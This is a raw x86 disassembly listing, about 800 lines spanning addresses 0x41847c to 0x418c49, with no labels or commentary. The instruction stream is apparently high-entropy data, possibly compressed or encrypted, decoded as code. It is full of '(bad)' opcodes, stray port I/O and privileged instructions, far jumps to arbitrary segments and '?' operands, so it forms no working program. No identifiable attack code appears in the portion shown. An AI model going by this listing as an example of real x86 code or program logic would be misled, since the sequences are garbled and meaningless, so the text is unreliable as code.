  41847c:	sub    al,0xb4
  41847e:	mov    WORD PTR [ebx+0x65],ss
  418481:	aam    0xe7
  418483:	jl     0x418466
  418485:	cdq    
  418486:	lods   eax,DWORD PTR ds:[esi]
  418487:	jno    0x4184b3
  418489:	cmp    ebx,DWORD PTR [eax]
  41848b:	pop    edi
  41848c:	cmc    
  41848d:	ss jl  0x418503
  418490:	add    DWORD PTR [ecx],esi
  418492:	cmp    esp,edx
  418494:	or     dl,ch
  418496:	pushf  
  418497:	ss fs aas 
  41849a:	jno    0x41849f
  41849c:	retf   
  41849d:	(bad)  
  41849e:	shl    DWORD PTR [ecx-0x50],cl
  4184a1:	into   
  4184a2:	push   edi
  4184a3:	push   ss
  4184a4:	xchg   esi,eax
  4184a5:	add    DWORD PTR [edx],eax
  4184a7:	fisub  WORD PTR [esi-0x20]
  4184aa:	out    0x89,eax
  4184ac:	into   
  4184ad:	add    BYTE PTR [edi-0x4e],al
  4184b0:	lahf   
  4184b1:	jle    0x418520
  4184b3:	mov    eax,0xdf339895
  4184b8:	lock pop ebx
  4184ba:	push   ecx
  4184bb:	into   
  4184bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184bd:	cmp    BYTE PTR [ecx+0x3d75d2a7],0x25
  4184c4:	inc    edi
  4184c5:	je     0x418496
  4184c7:	ret    0xc7c8
  4184ca:	shl    BYTE PTR [ebx+0x79309cf9],cl
  4184d0:	pushf  
  4184d1:	push   esp
  4184d2:	and    eax,0x60b3c17c
  4184d7:	pop    edi
  4184d8:	push   eax
  4184d9:	scas   al,BYTE PTR es:[edi]
  4184da:	scas   al,BYTE PTR es:[edi]
  4184db:	jmp    0x4184a7
  4184dd:	scas   al,BYTE PTR es:[edi]
  4184de:	sub    edx,DWORD PTR [ebx]
  4184e0:	outs   dx,BYTE PTR es:[esi]
  4184e2:	in     eax,0x66
  4184e4:	icebp  
  4184e5:	jb     0x4184d1
  4184e7:	jge    0x4184ba
  4184e9:	sahf   
  4184ea:	xchg   ebx,eax
  4184eb:	out    0x22,al
  4184ed:	popf   
  4184ee:	test   dh,ch
  4184f0:	das    
  4184f1:	pushw  es
  4184f3:	sbb    edi,esi
  4184f5:	fstp   DWORD PTR [esi-0x7719db76]
  4184fb:	xor    al,0xbc
  4184fd:	sbb    al,al
  4184ff:	cmc    
  418500:	xlat   BYTE PTR ds:[ebx]
  418501:	mov    al,ds:0x71f8dd1e
  418506:	or     BYTE PTR [edi],0xa4
  418509:	in     al,0xb2
  41850b:	xlat   BYTE PTR ds:[ebx]
  41850c:	out    0x7e,eax
  41850e:	pop    eax
  41850f:	xlat   BYTE PTR ds:[ebx]
  418510:	add    ebx,esi
  418512:	mov    esp,0xe11075ed
  418517:	fs inc ebp
  418519:	int    0xc3
  41851b:	xchg   esp,eax
  41851c:	int    0xce
  41851e:	out    dx,al
  41851f:	and    ecx,DWORD PTR [edi+0xb9d60d0]
  418525:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418526:	adc    eax,0xacb5d0be
  41852b:	ds gs jne 0x41859a
  41852f:	scas   al,BYTE PTR es:[edi]
  418530:	cmp    DWORD PTR [ecx+0x6a],ebp
  418533:	shl    DWORD PTR [eax+edx*8],cl
  418536:	jecxz  0x418508
  418538:	(bad)  
  418539:	cli    
  41853a:	fist   DWORD PTR [edx]
  41853c:	mov    eax,0x3268383b
  418541:	(bad)  
  418542:	sbb    eax,0xb785a592
  418547:	or     ebp,DWORD PTR [edx+edx*1]
  41854a:	xchg   ecx,eax
  41854b:	sbb    DWORD PTR ds:0x82ec2468,ebx
  418551:	sbb    eax,0xc50527ba
  418556:	fdivr  QWORD PTR [ebp-0x26fb3794]
  41855c:	sahf   
  41855d:	jb     0x418508
  41855f:	or     ah,ah
  418561:	inc    eax
  418562:	in     eax,dx
  418563:	frstor [ebx+0x6d]
  418566:	or     ebx,esi
  418568:	mov    ds:0x92372e32,eax
  41856d:	les    ecx,FWORD PTR [eax-0x48]
  418570:	mov    ch,0x37
  418572:	out    dx,eax
  418573:	xchg   esi,eax
  418574:	ffree  st(4)
  418576:	mov    ebp,0x3e45eeda
  41857b:	sub    DWORD PTR [ebp-0x573bc0d5],0x1415d686
  418585:	sub    al,0xb8
  418587:	pop    ecx
  418588:	(bad)  [eax+0x2e]
  41858b:	pop    edx
  41858c:	cmp    DWORD PTR [eax],ebp
  41858e:	sub    eax,0x5c1a21d4
  418593:	jbe    0x418526
  418595:	add    eax,0xca13eace
  41859a:	push   es
  41859b:	and    BYTE PTR [ebp+0x39],ch
  41859e:	add    BYTE PTR [ebx-0x6cb7cf38],bh
  4185a4:	mov    al,ds:0x2f5389b9
  4185a9:	imul   ecx,DWORD PTR [ebx+0x5c9825a5],0x14d1acdd
  4185b3:	out    dx,al
  4185b4:	push   ss
  4185b5:	ret    
  4185b6:	ret    
  4185b7:	adc    al,0x88
  4185b9:	mov    ch,0x1c
  4185bb:	push   ecx
  4185bc:	add    eax,0xe537e1f6
  4185c1:	and    dh,BYTE PTR [eax+edx*8]
  4185c4:	jle    0x418644
  4185c6:	in     al,0x20
  4185c8:	mov    dh,0xef
  4185ca:	jo     0x4185a9
  4185cc:	out    dx,eax
  4185cd:	or     al,0xbb
  4185cf:	dec    ecx
  4185d0:	dec    edx
  4185d1:	loopne 0x418632
  4185d3:	push   ebx
  4185d4:	test   DWORD PTR [edi-0x5b],eax
  4185d7:	mov    WORD PTR [ebx],ss
  4185d9:	mov    edx,0x46c92955
  4185de:	push   ebp
  4185df:	dec    edi
  4185e0:	push   edi
  4185e1:	out    dx,eax
  4185e2:	adc    al,0x16
  4185e4:	inc    edi
  4185e5:	shl    DWORD PTR [esi+0x7210b4f5],cl
  4185eb:	(bad)  
  4185ec:	addr16 repz xchg esi,eax
  4185ef:	push   ss
  4185f0:	je     0x418602
  4185f2:	shr    DWORD PTR [ebx-0x3e9da884],0x0
  4185f9:	push   esp
  4185fa:	mov    eax,0xe3f08d3a
  4185ff:	out    dx,al
  418600:	push   ds
  418601:	fwait
  418602:	pop    ebx
  418603:	xor    cl,ch
  418605:	hlt    
  418606:	xor    al,0xf
  418608:	fbstp  TBYTE PTR [ebx+0x15]
  41860b:	cwde   
  41860c:	push   ss
  41860d:	adc    BYTE PTR [esi+0x2e],bh
  418610:	fld    QWORD PTR es:[ebp+esi*2-0x47ffcf8b]
  418618:	aas    
  418619:	xor    eax,0xf93f5f5a
  41861e:	cs and ax,0x11e5
  418624:	pop    ebx
  418625:	in     al,dx
  418626:	inc    ebp
  418627:	jbe    0x41868a
  418629:	in     al,dx
  41862a:	(bad)  [ecx-0x20]
  41862d:	hlt    
  41862e:	or     ah,ch
  418630:	rcl    BYTE PTR [ebx+ebp*4],0x1f
  418634:	or     al,0x8f
  418636:	nop
  418637:	and    dh,BYTE PTR [edi-0x72608bca]
  41863d:	cmc    
  41863e:	mov    ah,0x32
  418640:	mov    ebp,0x2bf2e9ce
  418645:	out    0x1d,eax
  418647:	retf   0x9feb
  41864a:	out    dx,eax
  41864b:	loop   0x418658
  41864d:	loop   0x418611
  41864f:	sub    bl,BYTE PTR [esi-0x63]
  418652:	xchg   edx,eax
  418653:	mov    WORD PTR [edi+edx*1],gs
  418656:	sub    bh,ah
  418658:	mov    WORD PTR [edi-0x26],ss
  41865b:	xor    edi,DWORD PTR [edx+0xe]
  41865e:	add    BYTE PTR [eax-0x48],dh
  418661:	jno    0x4185ef
  418663:	jne    0x41864e
  418665:	popf   
  418666:	dec    ebx
  418667:	xor    edx,esi
  418669:	mov    dh,0x77
  41866b:	shl    BYTE PTR [edi-0x34],1
  41866e:	stos   DWORD PTR es:[edi],eax
  41866f:	xchg   esp,eax
  418670:	dec    edi
  418671:	stos   DWORD PTR es:[edi],eax
  418672:	call   0xd757:0x4abb4bf6
  418679:	adc    DWORD PTR [ecx-0x5100bc3f],esi
  41867f:	icebp  
  418680:	call   0x7598aa1d
  418685:	push   ds
  418686:	in     al,0x1e
  418688:	outs   dx,DWORD PTR ds:[esi]
  418689:	mov    cl,0xe3
  41868b:	jne    0x4186ec
  41868d:	dec    ebp
  41868e:	in     eax,0x10
  418690:	js     0x41866a
  418692:	and    BYTE PTR [ebx],bh
  418694:	cmp    eax,0x59aaf53e
  418699:	adc    DWORD PTR [ebx+0x162a0b4e],edx
  41869f:	gs jge 0x418692
  4186a2:	scas   eax,DWORD PTR es:[edi]
  4186a3:	outs   dx,DWORD PTR ds:[esi]
  4186a4:	test   BYTE PTR [edi-0x32],cl
  4186a7:	xchg   DWORD PTR [esi+eax*8+0x62847d29],eax
  4186ae:	pop    DWORD PTR [esi+ecx*1-0x7]
  4186b2:	and    eax,0x332b75eb
  4186b7:	dec    ecx
  4186b8:	mov    cl,0x38
  4186ba:	pop    ebx
  4186bb:	out    dx,al
  4186bc:	and    DWORD PTR es:[eax-0x510ff2b6],eax
  4186c3:	xor    edx,DWORD PTR [esi]
  4186c5:	or     edi,DWORD PTR [ebx-0x57]
  4186c8:	xlat   BYTE PTR ds:[ebx]
  4186c9:	xchg   ebp,eax
  4186ca:	and    BYTE PTR [ebp+0x3f],al
  4186cd:	push   eax
  4186ce:	sbb    cl,al
  4186d0:	stos   BYTE PTR es:[edi],al
  4186d1:	jp     0x418736
  4186d3:	mov    esi,0xc295bf9
  4186d8:	push   esi
  4186d9:	xchg   bh,dl
  4186db:	xor    esi,DWORD PTR [ebx+0x52]
  4186de:	sbb    al,0x93
  4186e0:	out    dx,al
  4186e1:	ins    DWORD PTR es:[edi],dx
  4186e2:	lds    edi,FWORD PTR [edx+0x31d5604f]
  4186e8:	mov    ah,0x6c
  4186ea:	test   al,0x1e
  4186ec:	xor    BYTE PTR [ebx+0x18d4ac00],ah
  4186f2:	push   ebx
  4186f3:	mov    cl,BYTE PTR [ecx+ebp*8]
  4186f6:	mul    BYTE PTR [edi+0x48]
  4186f9:	jae    0x418723
  4186fb:	dec    ebx
  4186fc:	jle    0x418694
  4186fe:	pop    ss
  4186ff:	adc    ah,dl
  418701:	es mov ch,0xaa
  418704:	pop    ss
  418705:	leave  
  418706:	mov    ecx,0xc9b5c9d6
  41870b:	sub    BYTE PTR [edi-0x5b73187e],dh
  418711:	xchg   esi,eax
  418712:	ror    DWORD PTR [ebp+0x3ea8e5dc],1
  418718:	adc    al,0xbd
  41871a:	dec    edx
  41871b:	pop    ebp
  41871c:	cmp    al,0x74
  41871e:	xchg   edi,ecx
  418720:	mov    cl,0x73
  418722:	mov    dh,0x5f
  418724:	xchg   edx,eax
  418725:	sbb    BYTE PTR ds:0xc5a44444,ah
  41872b:	push   esp
  41872c:	bound  edx,QWORD PTR [esp+edx*4-0x459a5389]
  418733:	popa   
  418734:	mov    ds:0xc19c148c,eax
  418739:	or     edi,edx
  41873b:	and    esi,ecx
  41873d:	fdivr  DWORD PTR [ecx+0x7f]
  418740:	cmp    al,BYTE PTR [ebx]
  418742:	mov    ah,0x69
  418744:	jecxz  0x4187b6
  418746:	inc    ebx
  418747:	dec    esp
  418748:	aaa    
  418749:	imul   esp,DWORD PTR [ecx+eiz*1],0x2ce0f834
  418750:	mov    cl,dl
  418752:	pop    ss
  418753:	pop    eax
  418754:	adc    eax,0x1fb33c1b
  418759:	cwde   
  41875a:	mov    cl,0xbb
  41875c:	mov    ecx,ecx
  41875e:	jge    0x41879f
  418760:	(bad)  
  418761:	in     eax,0x4a
  418763:	inc    eax
  418764:	or     eax,0x29101f50
  418769:	mov    bh,0x53
  41876b:	(bad)  
  41876d:	jmp    0xe16d:0x620c
  418773:	retf   0xda69
  418776:	sbb    eax,ebp
  418778:	bound  edx,QWORD PTR ds:0x4820940b
  41877e:	pusha  
  41877f:	and    ecx,ebx
  418781:	mov    ds:0xef32aa19,al
  418786:	mov    eax,ds:0x2f860345
  41878b:	fdiv   QWORD PTR [ebx]
  41878d:	sti    
  41878e:	mov    ds:0xbd70969,al
  418793:	mov    DWORD PTR [ecx],ecx
  418795:	std    
  418796:	aaa    
  418797:	inc    eax
  418798:	sub    ecx,DWORD PTR [edi+0x5b9f7dd9]
  41879e:	push   ebp
  41879f:	jge    0x4187e0
  4187a1:	mov    al,0x5a
  4187a3:	and    DWORD PTR [edx-0x44],ebx
  4187a6:	dec    eax
  4187a7:	mov    al,0xa6
  4187a9:	stc    
  4187aa:	fs jo  0x41879d
  4187ad:	paddusb mm1,QWORD PTR [ebx]
  4187b0:	mov    dl,0x5e
  4187b2:	in     al,dx
  4187b3:	icebp  
  4187b4:	iret   
  4187b5:	jecxz  0x4187e9
  4187b7:	mov    ecx,0x7916e42d
  4187bc:	iret   
  4187bd:	inc    edi
  4187be:	mov    ds:0xf6a71808,eax
  4187c3:	jo     0x418753
  4187c5:	shl    BYTE PTR [ecx],1
  4187c7:	loope  0x41882a
  4187c9:	shl    BYTE PTR [ebx+0x5285e1e7],1
  4187cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187d0:	xchg   esi,eax
  4187d1:	dec    esp
  4187d2:	xchg   dh,ch
  4187d4:	popf   
  4187d5:	(bad)  
  4187d6:	push   ecx
  4187d7:	jno    0x4187b6
  4187d9:	inc    ecx
  4187da:	std    
  4187db:	mov    ebx,0x713b438a
  4187e0:	sbb    dh,bl
  4187e2:	mov    eax,ds:0xa9fcf083
  4187e7:	inc    edx
  4187e8:	inc    esp
  4187e9:	fmul   st(2),st
  4187eb:	call   0x204950a1
  4187f0:	(bad)  
  4187f1:	jecxz  0x418811
  4187f3:	fimul  WORD PTR [eax+esi*1-0x627c228b]
  4187fa:	mov    ds:0x725158a7,eax
  4187ff:	adc    cl,BYTE PTR [eax+0x5a97a17]
  418805:	sub    BYTE PTR [eax],bl
  418807:	sub    bl,ch
  418809:	xchg   ebx,ebp
  41880b:	pusha  
  41880c:	push   edi
  41880d:	sti    
  41880e:	push   es
  41880f:	out    dx,al
  418810:	(bad)  
  418811:	jp     0x418840
  418813:	neg    ch
  418815:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418816:	(bad)  
  418817:	pop    ds
  418818:	dec    esi
  418819:	xlat   BYTE PTR ds:[ebx]
  41881a:	repz xor bh,ch
  41881d:	adc    al,0x2d
  41881f:	mov    dh,0xb8
  418821:	inc    ebp
  418822:	mov    edx,0xa381ece6
  418827:	dec    eax
  418828:	fwait
  418829:	push   edi
  41882a:	jnp    0x4187e5
  41882c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41882d:	mov    WORD PTR [edx-0x4e49a724],ds
  418833:	or     eax,0x696a7664
  418838:	jmp    0x26a2:0x1fedf396
  41883f:	mov    ebx,0x1baf7485
  418844:	mov    cl,0xa
  418846:	push   eax
  418847:	mov    edx,0x8113c784
  41884c:	push   esp
  41884d:	sbb    eax,0xc3505163
  418852:	adc    BYTE PTR [ebp+0x4037a7af],0x22
  418859:	bound  esi,QWORD PTR [ecx+0x50d9d021]
  41885f:	add    DWORD PTR [edi+0x10],ebp
  418862:	mov    ch,0xe0
  418864:	cmp    BYTE PTR [edx],al
  418866:	icebp  
  418867:	mov    al,ds:0x5c855cbe
  41886c:	jbe    0x41880d
  41886e:	dec    esi
  41886f:	jne    0x41881f
  418871:	ret    0x6902
  418874:	fstp   TBYTE PTR [ebx]
  418876:	push   ebp
  418877:	rol    BYTE PTR [ebx+0x9],1
  41887a:	popa   
  41887b:	mov    dh,0x6a
  41887d:	and    ebx,DWORD PTR [ecx]
  41887f:	mov    ds:0xc444bf5a,eax
  418884:	mov    eax,ds:0x566c099f
  418889:	sub    eax,0x6fdd43c
  41888e:	xchg   BYTE PTR [ecx-0x6f],bh
  418891:	add    BYTE PTR [ebp-0xb],al
  418894:	call   0x239615b1
  418899:	cwde   
  41889a:	push   edi
  41889b:	xchg   esi,eax
  41889c:	dec    edi
  41889d:	ret    0x5ff3
  4188a0:	outs   dx,BYTE PTR ds:[esi]
  4188a1:	sbb    BYTE PTR [edi],bl
  4188a3:	cmp    edi,DWORD PTR [edx]
  4188a5:	cmp    ah,BYTE PTR [ebx]
  4188a7:	arpl   WORD PTR [eax+0x1c],sp
  4188aa:	cmp    edx,DWORD PTR [ecx+ebp*8-0x66c4acda]
  4188b1:	je     0x418891
  4188b3:	pop    ecx
  4188b4:	sub    DWORD PTR [esi],esp
  4188b6:	aam    0xc8
  4188b8:	cmc    
  4188b9:	sub    al,0x8a
  4188bb:	mov    ecx,0xcbbbc5a4
  4188c0:	test   DWORD PTR [eax+0x61],0x7658fd31
  4188c7:	fs push edx
  4188c9:	jmp    0x7f74:0x8d973bfe
  4188d0:	push   ebp
  4188d1:	mov    ds:0xc39a72e5,eax
  4188d6:	jne    0x22e4f6d
  4188dc:	cmp    al,0x9c
  4188de:	mov    WORD PTR [ebx-0x1],ds
  4188e1:	cwde   
  4188e2:	push   ds
  4188e3:	cmp    BYTE PTR [edi+0x7f7aeaf],ah
  4188e9:	push   esi
  4188ea:	cmc    
  4188eb:	mov    eax,ds:0xf3814423
  4188f0:	test   al,0xb2
  4188f2:	mov    al,ds:0x7cfc2bca
  4188f7:	aad    0x79
  4188f9:	loop   0x418930
  4188fb:	sbb    BYTE PTR [ebx+0x24],dl
  4188fe:	or     eax,0x110a2ef1
  418903:	sbb    cl,dl
  418905:	popa   
  418906:	(bad)  
  418908:	ret    0xf47a
  41890b:	loopne 0x41893a
  41890d:	mov    ds:0x2a521467,al
  418912:	mov    ds:0x4d7f0bdf,al
  418917:	out    0x90,eax
  418919:	or     DWORD PTR [ecx],edx
  41891b:	aaa    
  41891c:	mov    esi,0x15cfa790
  418921:	fdivr  DWORD PTR [edi+esi*1+0x5ee7f68f]
  418928:	sub    bl,BYTE PTR [edx]
  41892a:	add    dl,BYTE PTR [ebp-0x45]
  41892d:	icebp  
  41892e:	add    eax,0x2a409e1c
  418933:	xlat   BYTE PTR ss:[ebx]
  418935:	fs inc esp
  418937:	xor    BYTE PTR [esi],ch
  418939:	dec    esp
  41893a:	ja     0x418905
  41893c:	test   BYTE PTR ds:0xd9b86ffd,al
  418942:	mov    al,ds:0xf62a5357
  418947:	stc    
  418948:	(bad)  
  418949:	jb     0x4189b6
  41894b:	popa   
  41894c:	sub    eax,0x5776af5a
  418951:	mov    ds:0xb435b324,eax
  418956:	in     eax,0xa6
  418958:	dec    eax
  418959:	cmp    eax,0xf4521eef
  41895e:	and    DWORD PTR [ebp+ebp*2+0x5e090531],edx
  418965:	add    ecx,DWORD PTR [ecx+0x40123fc3]
  41896b:	call   0x921b:0x630ceedb
  418972:	jp     0x418927
  418974:	bound  ebx,QWORD PTR [ebx]
  418976:	sub    BYTE PTR [edi-0x19],cl
  418979:	and    dl,BYTE PTR [ecx+eiz*1]
  41897c:	mov    cl,0xa3
  41897e:	loopne 0x4189a5
  418980:	inc    esi
  418981:	loopne 0x41895d
  418983:	(bad)  
  418984:	xchg   ebx,eax
  418985:	xor    BYTE PTR [edi+esi*1],cl
  418988:	mov    al,0x39
  41898a:	test   eax,0x2a3679bc
  41898f:	daa    
  418990:	ins    BYTE PTR es:[edi],dx
  418991:	sbb    BYTE PTR [ecx-0x1d],dh
  418994:	xor    DWORD PTR [esi],ebx
  418996:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418997:	repnz inc edx
  418999:	int    0x76
  41899b:	(bad)  
  41899c:	mov    al,ds:0x636464ed
  4189a1:	pusha  
  4189a2:	inc    esp
  4189a3:	(bad)  
  4189a4:	pop    ecx
  4189a5:	mov    cl,0x7e
  4189a7:	dec    ecx
  4189a8:	add    ebp,edx
  4189aa:	das    
  4189ab:	mov    ah,cl
  4189ad:	lea    edx,[edi]
  4189af:	ins    DWORD PTR es:[edi],dx
  4189b0:	jno    0x418969
  4189b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189b3:	sbb    al,0x5d
  4189b5:	push   eax
  4189b6:	out    dx,eax
  4189b7:	clc    
  4189b8:	jle    0x4189c7
  4189ba:	cmp    DWORD PTR [ebx+0x73],ebx
  4189bd:	lods   eax,DWORD PTR ds:[esi]
  4189be:	or     BYTE PTR [esi+0x16],0x8
  4189c2:	mov    ds:0x9c4d2468,al
  4189c7:	call   0x19187b8
  4189cc:	mov    cl,0xcc
  4189ce:	sbb    al,BYTE PTR [eax+edi*2-0x60]
  4189d2:	pop    esi
  4189d3:	popf   
  4189d4:	jmp    0xa851bd52
  4189d9:	adc    eax,0xb6341684
  4189de:	mov    esp,0x1b6b7967
  4189e3:	daa    
  4189e4:	jmp    0x4929:0x46bf866a
  4189eb:	cwde   
  4189ec:	nop
  4189ed:	mov    bh,0x5a
  4189ef:	aad    0x1f
  4189f1:	clc    
  4189f2:	cmp    eax,0x1e86e9ff
  4189f7:	pop    eax
  4189f8:	daa    
  4189f9:	mov    ebx,0x48875739
  4189fe:	sub    dh,BYTE PTR [ebp+0x6e]
  418a01:	mov    al,ds:0x1093f62b
  418a06:	rcr    BYTE PTR [eax+edx*4-0x5f44abad],0xe5
  418a0e:	rcl    DWORD PTR [ebp+0x57],cl
  418a11:	inc    esi
  418a12:	js     0x418a18
  418a14:	xor    BYTE PTR [edx+0x6],ah
  418a17:	push   edi
  418a18:	popf   
  418a19:	inc    eax
  418a1b:	lods   al,BYTE PTR ds:[esi]
  418a1c:	mov    al,ds:0xd3f3c1d7
  418a21:	scas   al,BYTE PTR es:[edi]
  418a22:	mov    eax,0xe97a3625
  418a27:	imul   eax,DWORD PTR [eax+0x1e491aaa],0xf652ba69
  418a31:	mov    WORD PTR [ebp+0x3f010982],?
  418a37:	pop    ds
  418a38:	shl    DWORD PTR [ebp+0x5b4cfe57],1
  418a3e:	pop    ds
  418a3f:	dec    esi
  418a40:	std    
  418a41:	jnp    0x418a7f
  418a43:	cmp    DWORD PTR [ebp-0x74],eax
  418a46:	leave  
  418a47:	sbb    eax,0x9072b2aa
  418a4c:	sbb    bh,bh
  418a4e:	xchg   esi,eax
  418a4f:	ins    DWORD PTR es:[edi],dx
  418a50:	ins    DWORD PTR es:[edi],dx
  418a51:	cs push eax
  418a53:	pop    ecx
  418a54:	push   ebp
  418a55:	out    dx,eax
  418a56:	hlt    
  418a57:	dec    edi
  418a58:	mov    ecx,0x6718e20d
  418a5d:	ret    0xef70
  418a60:	pop    edi
  418a61:	js     0x418a84
  418a63:	xor    al,0xb5
  418a65:	cmp    al,0xed
  418a67:	leave  
  418a68:	(bad)  
  418a69:	or     eax,0xc47b26e1
  418a6e:	dec    ebx
  418a6f:	fdivr  DWORD PTR [ebx]
  418a71:	jae    0x418aea
  418a73:	inc    esi
  418a74:	push   cs
  418a75:	cmp    DWORD PTR [edi+0xe593626],ebp
  418a7b:	cdq    
  418a7c:	or     DWORD PTR [edx-0x8],ebx
  418a7f:	lods   eax,DWORD PTR ds:[esi]
  418a80:	inc    ecx
  418a81:	fild   DWORD PTR [eax+ebx*4]
  418a84:	leave  
  418a85:	fwait
  418a86:	loopne 0x418a92
  418a88:	fistp  WORD PTR [edx]
  418a8a:	mov    dh,0x26
  418a8c:	popa   
  418a8d:	inc    edx
  418a8e:	mov    edi,0x361575bb
  418a93:	and    BYTE PTR [esi-0x1a52f802],ah
  418a99:	add    BYTE PTR [edx],bh
  418a9b:	sbb    al,0x5b
  418a9d:	(bad)  
  418a9e:	in     al,dx
  418a9f:	xchg   edi,eax
  418aa0:	(bad)  
  418aa1:	sar    DWORD PTR [edi],1
  418aa3:	dec    ebx
  418aa4:	in     eax,0x8a
  418aa6:	and    bh,BYTE PTR [edi+0x26ea03c8]
  418aac:	mov    bh,0x33
  418aae:	mov    edx,0x9a07a518
  418ab3:	lea    eax,[ecx+0x58afafb9]
  418ab9:	sub    BYTE PTR [ebp+0x29],0xf2
  418abd:	fimul  DWORD PTR [esi+0x51]
  418ac0:	je     0x418afa
  418ac2:	(bad)  
  418ac4:	call   0x3a4c:0x79dc5bb0
  418acb:	adc    DWORD PTR [edi],eax
  418acd:	or     eax,0xc7631fd
  418ad2:	mov    ds:0x7ff0b1fd,eax
  418ad7:	push   ebp
  418ad8:	pop    edx
  418ad9:	jg     0x418aa7
  418adb:	mov    al,ds:0x8704fc2c
  418ae0:	mov    ?,esp
  418ae2:	stos   BYTE PTR es:[edi],al
  418ae3:	std    
  418ae4:	js     0x418acf
  418ae6:	cmp    DWORD PTR [ecx+edi*2+0x4b],0xcb8b7c61
  418aee:	in     eax,0xa8
  418af0:	xchg   ebp,eax
  418af1:	mov    al,ds:0xef38d6d0
  418af6:	sub    bh,bh
  418af8:	push   gs
  418afa:	clc    
  418afb:	pop    es
  418afc:	fsub   st(4),st
  418afe:	inc    ecx
  418aff:	test   DWORD PTR [eax+0x53da6b61],eax
  418b05:	pusha  
  418b06:	shl    BYTE PTR [edi+edx*2-0x5a],cl
  418b0a:	lea    esp,[edx-0xe]
  418b0d:	ret    
  418b0e:	push   edi
  418b0f:	shr    BYTE PTR [edi+edi*8-0x80ac88e],cl
  418b16:	mov    al,0x5f
  418b18:	xor    eax,0xe087d7fe
  418b1d:	clc    
  418b1e:	xchg   BYTE PTR [eax-0x73eab594],dl
  418b24:	sub    DWORD PTR ds:0x20b7baf6,esp
  418b2a:	or     ch,ah
  418b2c:	push   0xfffffff7
  418b2e:	mov    ecx,0x9fd257c7
  418b33:	pop    ebp
  418b34:	add    dl,bh
  418b36:	or     al,0x18
  418b38:	sbb    eax,0x51a491e2
  418b3d:	jl     0x418ba7
  418b3f:	xchg   ebx,eax
  418b40:	call   0xbdf7:0x2b69675a
  418b47:	aad    0x44
  418b49:	add    BYTE PTR [edx-0x18a7f0b6],cl
  418b4f:	jno    0x418b6d
  418b51:	mov    al,ds:0xe55633d6
  418b56:	or     BYTE PTR [esi-0x7f],0xa6
  418b5a:	loopne 0x418b96
  418b5c:	std    
  418b5d:	xlat   BYTE PTR ds:[ebx]
  418b5e:	or     esi,DWORD PTR [ecx+0xb]
  418b61:	mov    edi,0xda2c4591
  418b66:	mov    dh,0x52
  418b68:	add    al,0xf1
  418b6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b6b:	jl     0x418af4
  418b6d:	loop   0x418b5e
  418b6f:	das    
  418b70:	or     edi,DWORD PTR [edi+0x63]
  418b73:	aas    
  418b74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b75:	dec    esi
  418b76:	or     al,dh
  418b78:	jle    0x418bc5
  418b7a:	adc    dl,BYTE PTR [esi]
  418b7c:	mov    ebp,0xc04bf198
  418b81:	mov    esp,0x80d0c553
  418b86:	add    DWORD PTR [edx],esp
  418b88:	call   0xedb82166
  418b8d:	or     al,0x8b
  418b8f:	fwait
  418b90:	pushf  
  418b91:	cmp    ecx,DWORD PTR [ebx+0x40a91bbd]
  418b97:	jle    0x418bcb
  418b99:	add    al,0x20
  418b9b:	xor    al,0x9a
  418b9d:	in     al,dx
  418b9e:	loope  0x418bc9
  418ba0:	push   es
  418ba1:	add    DWORD PTR [ebp-0x260c4e0b],eax
  418ba7:	jp     0x418b84
  418ba9:	add    ah,BYTE PTR [edi]
  418bab:	push   esi
  418bac:	dec    esp
  418bad:	call   0x4ae9a4c6
  418bb2:	in     al,dx
  418bb3:	mov    ah,0x38
  418bb5:	xor    al,0x93
  418bb7:	and    DWORD PTR [edx-0x47],esi
  418bba:	push   ebx
  418bbb:	mov    esp,edi
  418bbd:	ins    DWORD PTR es:[edi],dx
  418bbe:	aas    
  418bbf:	outs   dx,BYTE PTR ds:[esi]
  418bc0:	(bad)  [edx+eiz*1+0x73c4b37c]
  418bc7:	xchg   DWORD PTR [edx-0x78a15579],esi
  418bcd:	xchg   DWORD PTR [edi-0x7425693a],edi
  418bd3:	dec    edi
  418bd4:	in     al,0x1c
  418bd6:	inc    edi
  418bd7:	outs   dx,DWORD PTR ds:[esi]
  418bd8:	adc    eax,DWORD PTR [edx-0x6f]
  418bdb:	push   ds
  418bdc:	and    eax,0x970a9dab
  418be1:	sbb    DWORD PTR [ebx+0x78],edx
  418be4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418be5:	xchg   edx,eax
  418be6:	test   al,0x1e
  418be8:	(bad)  
  418be9:	in     al,dx
  418bea:	mov    edx,0xea0a0bbd
  418bef:	inc    esi
  418bf0:	cmp    esi,DWORD PTR [eax-0x3f]
  418bf3:	jge    0x418bcf
  418bf5:	pushf  
  418bf6:	repz jg 0x418c73
  418bf9:	lods   eax,DWORD PTR ds:[esi]
  418bfa:	hlt    
  418bfb:	pop    ebp
  418bfc:	xor    eax,0xa7350e2d
  418c02:	push   ecx
  418c03:	jno    0x418c42
  418c05:	aad    0x76
  418c07:	nop
  418c08:	idiv   ecx
  418c0a:	jae    0x418c1a
  418c0c:	dec    edi
  418c0d:	jne    0x418c0c
  418c0f:	test   BYTE PTR ds:0xb3672294,ah
  418c15:	sub    edx,edi
  418c17:	jns    0x418c6a
  418c19:	jmp    0xf4a18f3d
  418c1e:	scas   eax,DWORD PTR es:[edi]
  418c1f:	push   edi
  418c20:	cmp    al,0x81
  418c22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c23:	pop    ebx
  418c24:	xchg   ebx,eax
  418c25:	int3   
  418c26:	stos   DWORD PTR es:[edi],eax
  418c27:	pop    ecx
  418c28:	shr    BYTE PTR [ebx-0x1650f457],cl
  418c2e:	repz fs pop ecx
  418c31:	cmp    BYTE PTR [esi-0x1b7952e3],bh
  418c37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c38:	jae    0x418c85
  418c3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c3b:	ror    edi,0x7
  418c3e:	add    DWORD PTR [ecx+0x11],0xaf64f6fe
  418c45:	mov    dh,0xbb
  418c47:	jl     0x418c16
  418c49:	xor    al,0xae
